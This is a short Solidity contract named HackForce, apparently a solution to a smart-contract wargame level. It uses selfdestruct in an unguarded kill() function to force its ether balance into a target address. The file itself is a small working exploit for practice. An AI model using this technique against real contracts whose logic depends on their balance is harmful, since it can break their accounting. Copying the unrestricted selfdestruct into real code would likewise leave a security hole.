/**
 *Submitted for verification at Etherscan.io on 2022-12-20
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackForce {
    function kill(address payable _force) external {
        selfdestruct(_force);
    }
    receive() external payable {}
}